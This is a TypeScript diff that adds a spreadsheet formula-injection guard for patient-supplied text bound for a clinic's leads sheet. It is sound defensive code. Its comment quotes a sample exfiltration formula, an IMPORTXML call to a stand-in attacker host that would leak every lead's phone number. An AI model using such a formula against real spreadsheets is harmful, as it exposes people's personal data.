@@ -8,6 +8,22 @@ export function maskPhone(phone: string): string {
   return `***${digits.slice(-4)}`;
 }
 
+// Spreadsheet formula-injection guard. Google Sheets and Excel evaluate any cell
+// whose text starts with "=", "+", "-", "@", or a leading tab/CR as a live formula.
+// Patient-supplied text reaches the leads sheet verbatim (name, notes,
+// conversation_summary), so a message like
+//   =IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",D:D)),"//a")
+// would execute the moment the clinic opens the sheet and exfiltrate every lead's
+// phone number. Prefixing with a single quote forces Sheets to store and render the
+// value as literal text. This is the second layer — writes must ALSO use
+// valueInputOption "RAW" (see lib/googleSheets.ts), which stops evaluation at the
+// API boundary. Values that do not start with a trigger character pass through
+// unchanged, so this is a no-op for ordinary text.
+export function sanitizeSpreadsheetCell(value: string): string {
+  if (!value) return value;
+  return /^[=+\-@\t\r]/.test(value) ? `\x27${value}` : value;
+}
+
 const APO = "\x27";
 
 const CONTRACTIONS: Array<[RegExp, string]> = [
